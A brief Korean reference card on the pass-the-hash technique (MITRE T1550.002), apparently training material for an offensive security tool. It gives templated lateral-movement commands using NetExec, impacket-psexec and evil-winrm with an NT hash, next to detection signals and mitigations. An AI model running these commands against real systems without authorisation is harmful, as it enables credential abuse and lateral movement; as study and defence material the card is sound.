# 학습 시드(심화): pass-the-hash

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn pass-the-hash`. P1: 머신별 라이트업 미참조.

## 개요
Pass-the-Hash(T1550.002): NTLM 해시로 암호 없이 인증.

## 핵심 기법 · 열거
- LM/NT 해시로 SMB/WMI/WinRM 인증
- 로컬 관리자 해시 재사용(횡이동)

## 표준 도구 · 명령
```
nxc smb <target> -u Administrator -H <nthash>
impacket-psexec -hashes :<nthash> Administrator@<target>
evil-winrm -i <target> -u user -H <nthash>
```

## 블루팀 탐지
4624 Type3 NTLM 로그온·동일 해시 다수 호스트 인증·비대화형 관리자 로그온.

## 완화
LAPS(로컬관리자 암호 랜덤화)·Credential Guard·관리자 계층화·NTLM 제한.

- 출처(검증): https://attack.mitre.org/techniques/T1550/002/
